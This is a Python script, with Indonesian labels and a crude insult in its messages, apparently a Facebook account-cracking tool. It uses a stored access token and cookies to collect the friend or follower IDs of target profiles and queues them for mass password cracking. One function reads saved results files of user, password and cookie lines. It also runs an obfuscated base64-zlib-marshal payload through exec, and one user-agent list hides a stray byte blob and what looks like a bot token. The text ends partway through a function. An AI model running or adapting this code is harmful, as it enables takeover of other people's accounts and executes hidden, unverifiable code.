#UTF-PYTHON-3
#BUAT OLEH RIKSY - 27 April 2022

import os,sys
try:
	import rich
except ImportError:
	os.system('pip install rich')
	try:
		import rich
	except ImportError:
		os.sys.exit("[?] Maaf Ngab, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null)")
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as iprint
from rich.panel import Panel
from rich.tree import Tree
from rich import print as rprint
from rich.progress import track
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import Task
from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
from rich import filesize, get_console
console = Console()
from rich.console import Group
from rich.markdown import Markdown
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.box import DOUBLE, ROUNDED
from rich.padding import Padding
from rich.box import ROUNDED, Box
#from rich.box import loppp
#from rich.spinner import *
try:
	import os,sys
	try:
		import requests
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import bs4
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import stdiomask
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import mechanize
	except ImportError as e:
		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
		os.system(f"python -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip install {e.name} &> /dev/null")
		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
		os.system(f"python -m pip2 install {e.name} &> /dev/null")
	try:
		import subprocess
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="Kontol"
	except:musik_="Jangan"
except:pass
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
import requests as req
import time,random,json
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime
from urllib.parse import quote
from datetime import date

# --[WARNA]--
H = "#000000" # Hitam
M = "#FF0000" # Merah
I = "#00FF00" # Hijau
K = "#FFFF00" # Kuning
B = "#00C8FF" # Biru
U = "#AF00FF" # Ungu
P = "#FF00FF" # Pink
C = "#00FFFF" # Biru Muda
Q = "#FFFFFF" # Putih
J = "#FF8F00" # Jingga
A = "#AAAAAA" # Abu-Ab
O = "#FFA500" # OREN

# --[WARNAV2]--
p = '\x1b[0;97m' # PUTIH
m = '\x1b[0;91m' # MERAH
i = '\x1b[1;92m' # HIJAU
k = '\x1b[1;93m' # KUNING
b = '\x1b[1;94m' # BIRU
u = '\x1b[1;95m' # UNGU
c = '\x1b[0;96m' # BIRU MUDA
q='\x1b[0m'	# WARNA MATI
h = "\x1b[0;90m"     # Hitam
j = "\x1b[38;5;208m" # Jingga
a = "\x1b[38;5;248m" # Abu-Abu
o='\033[38;2;255;127;0;1m' #ORANGE

# --[WARNA DALAM]--
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"

#WARNA rick(kotak)
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN

# PENGATURAN WAKTU/JAMZ
ses = requests.Session()
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
jamz = datetime.now().strftime('%H:%M:%S')
jam_ = datetime.now().strftime('%H%M%S')
jam__ = str(datetime.now().strftime("%d%m%Y"))

# KUMPULAN USER AGNET
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2,ugen,ugen_,ugen__=[],[],[],[]
link_app,prox_k,id_ri,idd,id,loop,ok,cp,yyy,apk_me,pass_,method,prox_,opsi_y,url_met,pass_man,fps = [],"",[100063690353340],[],[],0,[],[],"AKTIF","TIDAK","","",[],"DOWN","","",""
#[100063690353340,110877271176800]
sistim=""
AnTi_rIkOd=""
def kotak(kata, wwe, wew):
	pertama = kata
	kedua   = mark(pertama, style=wwe)
	sol().print(kedua, style=wew)
def folder():
	try:os.mkdir("data")
	except:pass
	try:os.mkdir("results")
	except:pass
def play_mpv(x):
	if "Jangan" == musik_ or musik_ == "Jangan":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass

def cek_apk_hasil_crk():
	cekfile_crk("results")
	nama_z = input(">--Nama File--> ")
	if nama_z == "":kotak("# JANGAN KOSONG KONTOL",M,Q);time.sleep(2);exit()
	try:total__ = len(open(nama_z,"r").readlines())
	except FileNotFoundError:kotak('# FILE TIDAK ADA',K,Q);exit()
	with __Kiky__(max_workers=10) as (form):
		for data in open(nama_z,"r").readlines():
			try:
				data = data.replace("\n","")
				try:user, pw = data.split("|")
				except:user, pw, coki = data.split("|")
				form.submit(get_apk, user,pw,coki)
			except:pass
	exit()
class open_role:
	def __init__(self):
		global tiktok,pupuk,puput
		try:
			tiktok = open("data/login.txt","r").read()
		except:pass
		try:
			pupuk = open("data/cookie.txt","r").read()
			puput = {'cookie':pupuk}
		except:pass
class Main():
	def __init__(self):
		os.system("clear")
		open_role();self.intro()
	def menu_del(self, kataa):
		iprint(Panel(f"{MM}MOHON MAAF MENU {QQ}[{CC}{kataa}{QQ}]{MM} INI BELUM TERSEDIA... BACK TO MENU", style=Q));time.sleep(3)
		Main()
	def intro(self):
		_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==gkogSPAwoUMwTcIPhcIcsaTqpUfu5khV8uwmqtixPTWQrCEDVyZxCytmkYfbxVXEzbLKPm36Ljb9sRtYvYJ5ndrRhbmlUcmF3WUsnJf27hnCrQfO6oAOmgL+7tnCpQ7+JqI9FqCJLpV6lYuN2iUMnJMCpBGZgQbHQdLWSlhEZmZmblpUZMFGTlhgZKF2CipuZIFGSliAkaFTMAsDELDAkZLxJe')) # File Anti Rikod
		try:open("data/kata","r").read()
		except:open("data/kata","w").write("#SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
		now = datetime.now()
		hour = now.hour
		if hour < 4:
			waktu = "Selamat Dini Hari"
		elif 4 <= hour < 12:
			waktu = "Selamat Pagi"
		elif 12 <= hour < 15:
			waktu = "Selamat Siang"
		elif 15 <= hour < 17:
			waktu = "Selamat Sore"
		else:
			waktu = "Selamat Malam"
		try:token = open("data/login.txt","r").read()
		except:login()
		try:cookie = open("data/cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = f"{i}Token{q} And {k}Cookie{q}"
		except:
			zza = f"{i}Token{q}"
		try:sh = requests.get('https://httpbin.org/ip').json()
		except:sh = {'origin':'-'}
		tod = f"""		     ___                __            ____  __\n	  	    / _ \ ___ _  ____  / /__  ____   / __/ / /\n		   / // // _ `/ / __/ /  '_/ /____/ / _/  / _ \ \n		  /____/ \_,_/ /_/   /_/\_\        /_/   /_.__/"""
		my_ = Tree("                                 ",highlight=True, hide_root=True)
		my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")


		my_r = my__.add(f"{c}Mr.Risky{q}")
		my_rr= my_r.add(f"\r{k}My Github{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-991{q}")
		my_rr.add(f"{c}https://githuh.com/Dumai-200{q}")

		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
		my_rrr.add(f"{b}6283893415477{q}")


		code="""Wans X Gans
	Jeck X Nano
	Xenzi Ganz
	Radhin Al Haady
	Zee K World
	Moch Aang Ardiansyah XD"""
		pyhon = Syntax(code, "python", theme="monokai", line_numbers=True)
		my_rrrr=my_r.add(f"\r{b}My Team{q}")
		my_rrrr.add(Group(pyhon))


		my_rrrrr=my_r.add(f"\r{c}Information{q}")
		tod=my_rrrrr.add(f"{j}Grub WhatsApp{q}")
		tod.add(f"{b}https://chat.whatsapp.com/GOzdlYW8my4LlEKkscnxl1{q}")
		tod_=my_rrrrr.add(f"{j}Facebook Page(Halaman Facebook){q}")
		tod_.add(f"{b}https://www.facebook.com/101003905507650{q}")
		tod_.add(f"{b}https://www.facebook.com/110877271176800{q}")


		try:
			yz  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
			idz = zxc["id"]
		except:
			try:os.remove('data/login.txt')
			except:pass
			try:os.remove('data/cookie.txt')
			except:pass
			token= Tree("                                 ",highlight=True, hide_root=True)
			token_e= token.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
			prints(token_e)
			kotak("# TOKEN KADALUARSA", M, Q)
			os.sys.exit()
		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Anda{q}")
		data_.add(f"Username/Id       :{u}{nama}{q}")
		data_.add(f"Tanggal BerGabung :{u}{waktuu}{q}")
		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
		data_.add(f"Login Menggunakan :{u}{zza}{q}")
		prints(my__)





		top = f"""01
02
03
04
05
06

00"""
		tip = f"""Crack Dari Public
Crack Dari Public{QQ}({KK}MASAL{QQ})
Crack Dari Follow
Check Jumlah Teman
Check Hasil Crack
Check Options Akun Sesi

Log Out Dari Akun (Keluar)"""
		lpp = f"""{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN
{II}ONN

{II}ONN"""
		tod = me()
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_column("STATUS", style=M, justify='center')
		tod.add_row(top,tip, lpp)
		sol().print(tod, justify='center')
		self.pilihan()
	def pilihan(self):
		ki = input(f'>--Pilih 1-3--> ')
		if ki in ["1","01"]:self.public();os.sys.exit()
		elif ki in ["2","02"]:self.public_mass();os.sys.exit()
		elif ki in ["3","03"]:self.follow();os.sys.exit()
		elif ki in ["4","04"]:self.cek_jumlah_teman();os.sys.exit()
		elif ki in ["5","05"]:self.rek();os.sys.exit()
		elif ki in ["6","06"]:self.cek_opsi();os.sys.exit()
		elif ki in ["00","00"]:self.logut()
		else:
			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{ki}{QQ}] {MM}Anda Tidak Tersedia.."
			iprint(Panel(tod, style=Q))
			time.sleep(3),Main()
	def logut(self):
		try:os.remove('data/login.txt')
		except:pass
		try:os.remove('data/cookie.txt')
		except:pass
		kotak("# Token Dan Cookies Berhasil DiHapus (Berhasil Log Out)", M, Q)
		os.sys.exit()

	def ambil_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_nama(self,idd):
		try:
			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
			zxc = json.loads(yz.text)
			nama= zxc["name"]
		except Exception as e:
			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
			time.sleep(3)
			Main()
		return nama
	def ubah_user(self,username):
		try:
			if username == "me":
				return(username)
			else:
				url    = 'https://mbasic.facebook.com/' + username
				with requests.Session() as xyz:
					req = par(xyz.get(url,cookies=puput).content,'html.parser')
					kut = req.find('a',string='Lainnya')
					id = str(kut['href']).split('=')[1]
					id = id.replace("&refid","")
					# id = re.search('owner_id=(.*?)"',str(kut)).group(1)
					return(id)
		except Exception as e:return(username)
	def ubah_user1(self,idd):
			try:
				if idd == "me":idd = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idd), "check": "Lookup"}
					if "facebook" in idd:
						payload = {"fburl": idd, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idd = asw
			except:idd = idd
			return idd




	def public_mass(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# MASUKAN JUMLAH TARGER",K,Q)
		try:jmlh_ = int(input(">--Jumlah--> "))
		except:jmlh_ = 1
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		for x in range(jmlh_):
			idt = input(f">--{k}Target{q}--> : ")
			limit = ("10000")
			idt = self.ubah_user(idt)
			god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
			try:
				url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
				with requests.Session() as xyz:
					jso = json.loads(xyz.get(url,cookies=puput).text)
					for i in jso["friends"]["data"]:
						try:
							uid = i["id"]
							nama = i["name"]
							idd.append(uid+"<=>"+nama)
						except:pass
			except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def public(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def follow(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)

				for i in jso["subscribers"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda {QQ}({II}Recommended{QQ}){MM}\nCrack Dari Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def cek_jumlah_teman(self):
		try:
			token = open("data/login.txt", "r").read()
			toket = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			kotak("# MAAF TOKEN ANDA RUSAK/ERROR",M,Q)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						idd.append(uid)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Check Jumlah Teman Dari Akun Tertua\nCheck Jumlah Teman Dari Akun Termuda\nCheck Jumlah Teman Dari Random")
		sol().print(tod, justify='center')

